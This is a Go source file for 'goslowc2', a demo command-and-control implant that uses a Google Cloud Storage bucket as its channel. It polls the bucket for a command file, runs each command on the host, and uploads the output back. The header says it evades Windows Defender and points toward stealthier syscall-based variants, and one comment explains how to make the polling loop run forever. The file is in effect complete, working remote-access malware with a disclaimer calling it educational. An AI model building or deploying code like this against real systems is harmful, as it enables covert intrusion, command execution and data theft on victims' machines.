// DISCLAIMER: The author is NOT responsible for misuse or abuse of this educational source
// goslowc2 is a demo payload execution for using GCP Storage bucket and objects as the C2 mechanism
// at the time of development Q4 2022 windows defender did not trigger the OS.exec method unless functions were stripped at build itme
// for stealthier payload consider using my complement consider using direct WinAPI syscalls converting to unsigned integer pointers
// Author: Dennis Chow dchow[AT]xtecsystems.com 11/20/2022
// requirements: GCP storage bucket and service account credential foo.json in the same runtime directory
// confirmed working on GoLang 1.18.4 and GCP Storage SDK 1.28.0

package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"time"

	"cloud.google.com/go/storage"
)

//set auth state from json service account gcp
func init() {
	os.Setenv("GOOGLE_APPLICATION_CREDENTIALS", "<FILENAME-SVC-ACC.json>") // FILL IN WITH YOUR FILE PATH
}

// uploadFile uploads an object.
func uploadFile(bucket, object string) error {
	// bucket := "bucket-name"
	// object := "object-name"
	ctx := context.Background()
	client, err := storage.NewClient(ctx)
	if err != nil {
		return fmt.Errorf("storage.NewClient: %v", err)
	}
	defer client.Close()

	// Open local file.
	f, err := os.Open("./output.txt")
	if err != nil {
		return fmt.Errorf("os.Open: %v", err)
	}
	defer f.Close()

	ctx, cancel := context.WithTimeout(ctx, time.Second*50)
	defer cancel()

	o := client.Bucket(bucket).Object(object)

	// Upload an object with storage.Writer.
	wc := o.NewWriter(ctx)
	if _, err = io.Copy(wc, f); err != nil {
		return fmt.Errorf("io.Copy: %v", err)
	}
	if err := wc.Close(); err != nil {
		return fmt.Errorf("Writer.Close: %v", err)
	}
	return nil
}

//no return needed
func runBin(cmdbin string, cmdarg string) {
	//arguments
	//cmdbin := "whoami"
	//cmdarg := ""
	//cmd := exec.Command("ls", "-lah")
	//command constructor
	arg_len := len(cmdarg)
	if arg_len < 1 {
		cmd := exec.Command(cmdbin)
		// open the out file for writing
		outfile, err := os.Create("./output.txt")
		if err != nil {
			panic(err)
		}
		defer outfile.Close()

		stdoutPipe, err := cmd.StdoutPipe()
		if err != nil {
			panic(err)
		}

		writer := bufio.NewWriter(outfile)
		defer writer.Flush()

		err = cmd.Start()
		if err != nil {
			panic(err)
		}

		go io.Copy(writer, stdoutPipe)
		cmd.Wait()

	}
	if arg_len > 0 {
		cmd := exec.Command(cmdbin, cmdarg)
		// open the out file for writing
		outfile, err := os.Create("./output.txt")
		if err != nil {
			panic(err)
		}
		defer outfile.Close()

		stdoutPipe, err := cmd.StdoutPipe()
		if err != nil {
			panic(err)
		}

		writer := bufio.NewWriter(outfile)
		defer writer.Flush()

		err = cmd.Start()
		if err != nil {
			panic(err)
		}

		go io.Copy(writer, stdoutPipe)
		cmd.Wait()
	}

}

//specify the input file single line command return string
func readCmd(inputfilename string) string {
	file_input, _ := os.ReadFile(inputfilename)
	cmd_str := string(file_input)
	stripped_cmd := strings.TrimSuffix(cmd_str, "\r\n")
	return stripped_cmd
}

//ingest input.txt for parsing through readCmd and runBin
func downloadFile(bucket, object string, destFileName string) error {
	// bucket := "bucket-name"
	// object := "object-name"
	// destFileName := "file.txt"
	ctx := context.Background()
	client, err := storage.NewClient(ctx)
	if err != nil {
		return fmt.Errorf("storage.NewClient: %v", err)
	}
	defer client.Close()

	ctx, cancel := context.WithTimeout(ctx, time.Second*50)
	defer cancel()

	f, err := os.Create(destFileName)
	if err != nil {
		return fmt.Errorf("os.Create: %v", err)
	}

	rc, err := client.Bucket(bucket).Object(object).NewReader(ctx)
	if err != nil {
		return fmt.Errorf("Object(%q).NewReader: %v", object, err)
	}
	defer rc.Close()

	if _, err := io.Copy(f, rc); err != nil {
		return fmt.Errorf("io.Copy: %v", err)
	}

	if err = f.Close(); err != nil {
		return fmt.Errorf("f.Close: %v", err)
	}

	return nil

}

func main() {
	//driver section

	//bucket and object details
	var bucket string = "xtecsystems-labs"
	var object_input string = "input.txt"
	var object_output string = "output.txt"

	//find a random seeded polling period 1 and 5 min
	var maxsec int = 10
	var minsec int = 1
	rand.Seed(time.Now().UnixNano())
	random_sec := (rand.Intn(maxsec-minsec) + minsec)

	//sleep for random time in secs and poll the bucket for input.txt
	//setting for loop with stop conditions for emergencies. remove conditions for infinite loop
	var cycle int = 0
	for i := 0; i < 2; i++ {
		time.Sleep(time.Duration(random_sec) * time.Second)
		cycle += i
		fmt.Println("cycle: ", cycle)
		fmt.Println("cmdfile to parse: ", object_input)
		fmt.Println("outputfile to check: ", object_output)
		downloadFile(bucket, "input.txt", "input.txt") //stage to disk demo only. if you want in pure memory DIY.
		run_cmd := readCmd(object_input)
		runBin(run_cmd, "")               //use null string for no argument commands
		uploadFile(bucket, object_output) //return results to view in gcp storage
		os.Remove("input.txt")            //clean up file on each iteration vs. signal run on exit
	}

}

// Very useful references that helped me understand GoLang structures and future ideas
//https://adityarama1210.medium.com/simple-golang-api-uploader-using-google-cloud-storage-3d5e45df74a5
//https://stackoverflow.com/questions/18986943/in-golang-how-can-i-write-the-stdout-of-an-exec-cmd-to-a-file
//https://stackoverflow.com/questions/26006856/why-use-the-go-keyword-when-calling-a-function
//https://stackoverflow.com/questions/7151261/append-to-a-file-in-go
//https://cloud.google.com/storage/docs/samples/storage-upload-file?hl=en#storage_upload_file-go
//https://medium.com/@as27/a-simple-beginners-tutorial-to-io-writer-in-golang-2a13bfefea02
//https://www.grant.pizza/blog/the-beauty-of-io-writer/
//https://www.educative.io/answers/how-to-generate-random-numbers-in-a-given-range-in-go
//https://stackoverflow.com/questions/41432193/how-to-delete-a-file-using-golang-on-program-exit
